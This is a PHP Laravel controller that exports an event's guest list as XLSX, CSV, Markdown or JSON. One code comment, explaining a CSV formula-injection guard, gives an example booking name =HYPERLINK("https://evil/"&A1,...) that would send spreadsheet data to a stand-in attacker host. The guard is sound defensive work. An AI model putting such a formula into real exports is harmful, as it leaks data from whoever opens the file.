<?php

namespace App\Http\Controllers\Api;

use App\Exceptions\ApiError;
use App\Http\Controllers\Controller;
use App\Models\Event;
use App\Support\Emits;
use App\Support\GuestList;
use Dedoc\Scramble\Attributes\Endpoint;
use Dedoc\Scramble\Attributes\Group;
use Dedoc\Scramble\Attributes\Header;
use Dedoc\Scramble\Attributes\Response as DocumentedResponse;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Response;
use OpenSpout\Common\Entity\Row;
use OpenSpout\Writer\XLSX\Writer;
use Symfony\Component\HttpFoundation\StreamedResponse;

#[Group('Registration', weight: 40)]
class GuestListExportController extends Controller
{
    /**
     * Download the guest list as a file.
     *
     * Requires `registrations.view`. `{format}` is `xlsx`, `csv`, `md` or
     * `json`; any other value is a `404` from the router.
     *
     * Returns the list as an attachment named after the event: one row per
     * booking with the guest's details, a column for each of the event's
     * bookable options holding how many of it that booking took, the number
     * of people it covers, its total in francs and when it was made, then a
     * closing totals row for the caterer. Every format carries the same rows
     * in the same order.
     *
     * The CSV is semicolon-separated and carries a UTF-8 byte order mark, so
     * Excel opens it in columns and with accents intact.
     *
     * XLSX needs the PHP `zip` extension. A server without it answers
     * `503 xlsx_unavailable`, and CSV still works there.
     */
    // Aliased, because this controller already imports Symfony's Response as
    // its return type.
    #[DocumentedResponse(200, 'The guest list in the requested format. Same rows every time; only the encoding differs.')]
    #[Header('Content-Disposition', 'attachment, with a filename built from the event. Browsers save rather than render.', type: 'string')]
    #[Endpoint(operationId: 'registration.export')]
    #[Emits('xlsx_unavailable')]
    public function __invoke(Event $event, string $format): Response|StreamedResponse|JsonResponse
    {
        // One row builder (App\Support\GuestList), four formatters, so the
        // formats cannot disagree about the contents; a test asserts it.
        //
        // XLSX is the one a committee member opens in Excel. CSV is the
        // dependency-free fallback: openspout needs ext-zip, which is
        // unverified on the shared host, and without it this endpoint says so
        // instead of dying with "Class ZipArchive not found".
        //
        // Markdown is for pasting into notes or a message; JSON offers the
        // screen's rows as a file.
        $list = GuestList::for($event);

        return match ($format) {
            'xlsx' => $this->xlsx($list),
            'csv' => $this->csv($list),
            'md' => $this->markdown($list),
            'json' => $this->json($list),
            // Unreachable through the constrained route; kept so a widened
            // constraint cannot fall through to a 500.
            default => ApiError::json(404, 'not_found', 'Unknown export format'),
        };
    }

    private function xlsx(GuestList $list): JsonResponse|StreamedResponse
    {
        // A named refusal rather than a fatal, so an operator knows what to
        // ask the host for.
        if (! extension_loaded('zip')) {
            return ApiError::json(
                503,
                'xlsx_unavailable',
                'XLSX export needs the PHP zip extension, which this server does not have. Use CSV.',
            );
        }

        return response()->streamDownload(function () use ($list): void {
            $writer = new Writer;
            $writer->openToFile('php://output');

            $writer->addRow(Row::fromValues($list->headers()));
            foreach ($list->rows() as $row) {
                $writer->addRow(Row::fromValues($row));
            }
            $writer->addRow(Row::fromValues($list->totals()));

            $writer->close();
        }, $list->filename().'.xlsx', [
            'Content-Type' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        ]);
    }

    private function csv(GuestList $list): Response
    {
        $handle = fopen('php://temp', 'r+');

        // A UTF-8 BOM: Excel on Windows reads a BOM-less UTF-8 CSV in the
        // system codepage, so "Répétition" would show as "RÃ©pÃ©tition".
        fwrite($handle, "\xEF\xBB\xBF");

        // Semicolons, not commas: Swiss and French Excel treat ';' as the
        // field separator, and a comma-delimited file opens as one column.
        fputcsv($handle, $list->headers(), ';');
        foreach ($list->rows() as $row) {
            fputcsv($handle, array_map(self::defuse(...), $row), ';');
        }
        fputcsv($handle, array_map(self::defuse(...), $list->totals()), ';');

        rewind($handle);
        $csv = (string) stream_get_contents($handle);
        fclose($handle);

        return response($csv, 200, [
            'Content-Type' => 'text/csv; charset=UTF-8',
            'Content-Disposition' => 'attachment; filename="'.$list->filename().'.csv"',
        ]);
    }

    /**
     * Stops Excel executing a guest's name.
     *
     * Every identity column comes from the public booking form and is
     * validated only as a string, so a booking under the name
     * =HYPERLINK("https://evil/"&A1,"cliquez") is a live formula once a
     * committee member opens the CSV. A leading apostrophe makes Excel treat
     * the cell as text and is not displayed.
     *
     * CSV only. The XLSX writer emits typed string cells that Excel does not
     * re-parse, and nothing executes Markdown. Applied elsewhere, it would put
     * stray apostrophes in the other formats and break their agreement.
     */
    private static function defuse(mixed $cell): mixed
    {
        if (! is_string($cell) || $cell === '') {
            return $cell;
        }

        return str_contains("=+-@\t\r", $cell[0]) ? "'".$cell : $cell;
    }

    private function markdown(GuestList $list): Response
    {
        $line = fn (array $cells): string => '| '.implode(' | ', array_map(
            fn ($cell): string => str_replace('|', '\\|', (string) ($cell ?? '')),
            $cells
        )).' |';

        $lines = [$line($list->headers())];
        $lines[] = '| '.implode(' | ', array_fill(0, count($list->headers()), '---')).' |';

        foreach ($list->rows() as $row) {
            $lines[] = $line($row);
        }
        $lines[] = $line($list->totals());

        return response(implode("\n", $lines)."\n", 200, [
            'Content-Type' => 'text/markdown; charset=UTF-8',
            'Content-Disposition' => 'attachment; filename="'.$list->filename().'.md"',
        ]);
    }

    private function json(GuestList $list): JsonResponse
    {
        return response()->json([
            'headers' => $list->headers(),
            'rows' => $list->rows(),
            'totals' => $list->totals(),
        ], 200, [
            'Content-Disposition' => 'attachment; filename="'.$list->filename().'.json"',
        ]);
    }
}
